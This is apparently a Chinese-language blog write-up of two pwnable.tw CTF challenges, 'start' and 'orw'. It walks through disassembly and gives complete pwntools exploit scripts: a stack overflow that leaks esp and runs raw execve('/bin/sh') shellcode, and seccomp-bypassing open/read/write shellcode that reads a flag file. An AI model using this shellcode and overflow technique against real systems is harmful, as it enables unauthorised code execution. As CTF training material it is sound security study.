<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 ./start</span><br><span class="line">Let&#x27;s start the CTF:321</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 checksec start </span><br><span class="line">[*] &#x27;/home/pic/\xe4\xb8\x8b\xe8\xbd\xbd/start&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060 000 push    esp</span><br><span class="line">.text:08048061 004 push    offset _exit</span><br><span class="line">.text:08048066 008 xor     eax, eax</span><br><span class="line">.text:08048068 008 xor     ebx, ebx</span><br><span class="line">.text:0804806A 008 xor     ecx, ecx</span><br><span class="line">.text:0804806C 008 xor     edx, edx</span><br><span class="line">.text:0804806E 008 push    &#x27;:FTC&#x27;</span><br><span class="line">.text:08048073 00C push    &#x27; eht&#x27;</span><br><span class="line">.text:08048078 010 push    &#x27; tra&#x27;</span><br><span class="line">.text:0804807D 014 push    &#x27;ts s&#x27;</span><br><span class="line">.text:08048082 018 push    2774654Ch</span><br><span class="line">.text:08048087 01C mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089 01C mov     dl, 14h</span><br><span class="line">.text:0804808B 01C mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D 01C mov     al, 4</span><br><span class="line">.text:0804808F 01C int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091 01C xor     ebx, ebx</span><br><span class="line">.text:08048093 01C mov     dl, 3Ch</span><br><span class="line">.text:08048095 01C mov     al, 3</span><br><span class="line">.text:08048097 01C int     80h             ; LINUX -</span><br><span class="line">.text:08048099 01C add     esp, 14h</span><br><span class="line">.text:0804809C 008 retn</span><br></pre></td></tr></table></figure>

<p>本题中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:08048087 01C mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089 01C mov     dl, 14h</span><br><span class="line">.text:0804808B 01C mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D 01C mov     al, 4</span><br><span class="line">.text:0804808F 01C int     80h             ; LINUX - sys_write</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08048091 01C xor     ebx, ebx</span><br><span class="line">.text:08048093 01C mov     dl, 3Ch</span><br><span class="line">.text:08048095 01C mov     al, 3</span><br><span class="line">.text:08048097 01C int     80h             ; LINUX -</span><br></pre></td></tr></table></figure>

<p>可以发现它让我们写 0x3C 个字符,完全可以覆盖返回地址,本题有两个系统调用,一个是<code>sys_read(ax=3)</code>,另一个为<code>sys_write(ax=4)</code>,因为本题的<strong>NX</strong>是关的,我们直接在栈上写<strong>shellcode</strong>即可</p>
<p>要做的只有:</p>
<ul>
<li>知道<strong>esp</strong>的值</li>
<li>写<strong>shellcode</strong></li>
</ul>
<p>直接交exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = process(&#x27;./start&#x27;)</span><br><span class="line">pay=&#x27;a&#x27;*20+p32(0x08048087)</span><br><span class="line">p.sendafter(&#x27;CTF:&#x27;,pay)</span><br><span class="line">esp=u32(p.recv(4))</span><br><span class="line">print hex(esp)</span><br><span class="line">pay=&#x27;a&#x27;*20+p32(esp+0x14)+&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>同时我们要注意,第一个不能sendline,这样会破坏esp的值,其次在第二个传输的时候不要死脑筋,想着一定要布置到给定的20个字节中,直接让<code>esp+20</code>之后在从容的布置更加优雅</p>
<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 ./orw </span><br><span class="line">Give my your shellcode:12</span><br><span class="line">[1]    9368 segmentation fault (core dumped)  ./orw</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 checksec orw</span><br><span class="line">[*] &#x27;/home/pic/\xe4\xb8\x8b\xe8\xbd\xbd/orw&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:08048548 lea     ecx, [esp+4]</span><br><span class="line">.text:0804854C and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804854F push    dword ptr [ecx-4]</span><br><span class="line">.text:08048552 push    ebp</span><br><span class="line">.text:08048553 mov     ebp, esp</span><br><span class="line">.text:08048555 push    ecx</span><br><span class="line">.text:08048556 sub     esp, 4</span><br><span class="line">.text:08048559 call    orw_seccomp</span><br><span class="line">.text:0804855E sub     esp, 0Ch</span><br><span class="line">.text:08048561 push    offset aGiveMyYourShel ; &quot;Give my your shellcode:&quot;</span><br><span class="line">.text:08048566 call    _printf</span><br><span class="line">.text:0804856B add     esp, 10h</span><br><span class="line">.text:0804856E sub     esp, 4</span><br><span class="line">.text:08048571 push    0C8h</span><br><span class="line">.text:08048576 push    offset shellcode</span><br><span class="line">.text:0804857B push    0</span><br><span class="line">.text:0804857D call    _read</span><br><span class="line">.text:08048582 add     esp, 10h</span><br><span class="line">.text:08048585 mov     eax, offset shellcode</span><br><span class="line">.text:0804858A call    eax ; shellcode</span><br><span class="line">.text:0804858C mov     eax, 0</span><br><span class="line">.text:08048591 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048594 leave</span><br><span class="line">.text:08048595 lea     esp, [ecx-4]</span><br><span class="line">.text:08048598 retn</span><br></pre></td></tr></table></figure>

<p>可以看到在输出字符串之前有个<code>orw_seccomp</code>函数,此函数用来限制系统调用,我们只能调用4个函数,不过够了,其中有<code>open</code>,<code>write</code>和<code>read</code>,完全可以搞定,继续看汇编代码,<br>打印出<code>Give my your shellcode:</code>后,让我们在<code>0C8h</code>个字节里写入数据,之后直接调用这个<code>shellcode</code>,行,我们的思路如下:</p>
<ul>
<li>知道<strong>flag</strong>的位置</li>
<li>使用<code>open</code>打开flag文件</li>
<li>用<code>write</code>读出文件</li>
<li><code>read</code>打印出来</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;chall.pwnable.tw&quot;, 10001)</span><br><span class="line">shellcode = &quot;&quot;</span><br><span class="line">shellcode += shellcraft.i386.pushstr(&quot;/home/orw/flag&quot;)    </span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_open&quot;, &#x27;esp&#x27;)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_read&quot;, &#x27;eax&#x27;, &#x27;esp&#x27;, 0x30)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_write&quot;, 1, &#x27;esp&#x27;, 0x30)</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/06/25/2019-06-25-kr_1st/" data-id="cuid0rA8fwheV5E0GTdw6VkA6" data-title="pwnable.kr" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/10/01/1999-01-01-hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
          </li>
        
          <li>
            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
          </li>
        
          <li>
            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>